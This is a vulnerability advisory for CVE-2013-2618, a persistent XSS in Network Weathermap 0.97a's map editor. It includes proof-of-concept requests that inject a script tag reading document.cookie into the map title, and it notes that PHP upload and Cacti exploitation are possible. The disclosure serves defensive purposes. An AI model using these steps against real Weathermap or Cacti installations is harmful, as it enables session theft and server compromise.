@@ -1,0 +1,74 @@
+Network Weathermap 0.97a - Persistent XSS
+Earlier versions are also possibly vulnerable.
+
+INFORMATION
+
+Product: Network Weathermap 0.97a
+Remote-exploit: yes
+Vendor-URL: http://www.network-weathermap.com/
+
+Discovered by: Daniel Ricardo dos Santos
+CVE Request - 15/03/2013
+CVE Assign - 18/03/2013
+CVE Number - CVE-2013-2618
+Vendor notification - 18/03/2013
+Vendor reply - No reply
+Public disclosure - 01/04/2013
+
+OVERVIEW
+
+Network Weathermap 0.97a is vulnerable to a persistent XSS when displaying
+available files.
+
+INTRODUCTION
+
+Network Weathermap is a network visualisation tool, to take data you
+already have and show you an overview of your network in map form.
+Support is built in for RRD, MRTG (RRD and old log-format), and
+tab-delimited text files. Other sources are via plugins or external scripts.
+
+VULNERABILITY DESCRIPTION
+
+The vulnerability happens when a user injects HTML and Javascript into the
+title of a map in editor.php. This title is later shown to the user when
+listing the files in editor.php?action=newfile
+
+Besides the title, other fields also allow an attacker to upload malicious
+PHP code to a webserver, which can later be executed if the attacker has
+direct acess to that file.
+
+This application is often used as a plugin for Cacti. The vulnerability can
+be exploited in this mode as well, in
+weathermap-cacti-plugin-mgmt.php?action=viewconfig&file=<affected_file> and
+it can be used to exploit Cacti.
+
+To test it, simply create a map or edit an existing one:
+GET editor.php?mapname=test&action=newmap
+
+Then edit the map title with the payload:
+POST editor.php
+plug=0&mapname=test&action=set_map_properties&param=&param2=&debug=existing&node_name=&node_x=&node_y=&node_new_name=&node_label=&node_infourl=&node_hover=&node_iconfilename=--NONE--&link_name=&link_bandwidth_in=&link_bandwidth_out=&link_target=&link_width=&link_infourl=&link_hover=&link_commentin=&link_commentposin=95&link_commentout=&link_commentposout=5&map_title=%3Cscript%3Ealert%28document.cookie%29%3B%3C%2Fscript%3E&map_legend=Traffic+Load&map_stamp=Created%3A+%25b+%25d+%25Y+%25H%3A%25M%3A%25S&map_linkdefaultwidth=7&map_linkdefaultbwin=100M&map_linkdefaultbwout=100M&map_width=800&map_height=600&map_pngfile=&map_htmlfile=&map_bgfile=--NONE--&mapstyle_linklabels=percent&mapstyle_htmlstyle=overlib&mapstyle_arrowstyle=classic&mapstyle_nodefont=3&mapstyle_linkfont=2&mapstyle_legendfont=4&item_configtext=&editorsettings_showvias=0&editorsettings_showrelative=0&editorsettings_gridsnap=NO
+
+Then display the titles:
+GET editor.php
+
+VERSIONS AFFECTED
+
+Tested with version 0.97a (current release) but earlier versions are
+possibly vulnerable.
+
+SOLUTION
+
+There is no official patch currently available.
+
+NOTES
+
+The Common Vulnerabilities and Exposures (CVE) project has assigned the
+name CVE-2013-2618 to this issue. This is a candidate for inclusion in
+the CVE list (http://cve.mitre.org), which standardizes names for
+security problems.
+
+CREDITS
+
+Daniel Ricardo dos Santos
+SEC+ Information Security Company - http://www.secplus.com.br/
